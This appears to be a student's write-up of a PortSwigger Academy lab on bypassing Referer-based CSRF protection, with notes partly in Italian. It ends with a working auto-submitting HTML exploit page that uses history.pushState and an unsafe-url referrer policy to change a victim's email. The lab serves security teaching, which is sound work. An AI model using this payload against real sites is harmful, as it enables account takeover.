https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter






1) login as wiener:peter and try to change the email
    we can see that there is no csrf token but there is a Referer header

    if we try to change it using for example Referer: test.com then the server blocks the request because it is not valid
    
    if we try to remove completely the header the server blocks the request

    but if we try to modify the initial referer to malicious.initial_referer then it works and we are able to modify the email
    
    so basically we have a bad checking for the referer value

    Referer: https://malicious.0a0e00f60465b6fd81b14daf0000004d.web-security-academy.net/my-account?id=wiener
    it works



     we noticed that the site performs a validation looking if in the referer link we can match the same-site so basically it is a very huge problem because if we have as referer:
     http://malicious.com/?correct_valid_domain.net then the check is ok and the request is performed 


so what we need is to force our request to insert into the referer header correct_valid_domain.net as a query string to bypass the check


2 write the script

    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
    in pratica la pagina viene caricata e poi modificata in /?YOUR-LAB-ID.web-security-academy.net e questo ci permette di eseguire l'attacco. Serve ? se no si rompe il link, cos'Ã¬ invece referer diventa: https://exploit-0af3002e0490b36a8186248d01f9006a.exploit-server.net/exploit?0a7200b604d6b3c18144253800240081.web-security-academy.net

    we put <meta name="referrer" content="unsafe-url"> because if don't use it browsers for security reason will drop the query parameter

    so we have


<html>
    <head> 
          <meta name="referrer" content="unsafe-url">
    </head>
    <script> history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net") </script>

    <body>
        <form action="https://0af3005e045b71a7825df69a00f500c0.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="exploit@evil-user.net" />
        </form>
    
    
    <script> 
        document.forms[0].submit()
    </script>


    </body>
</html>
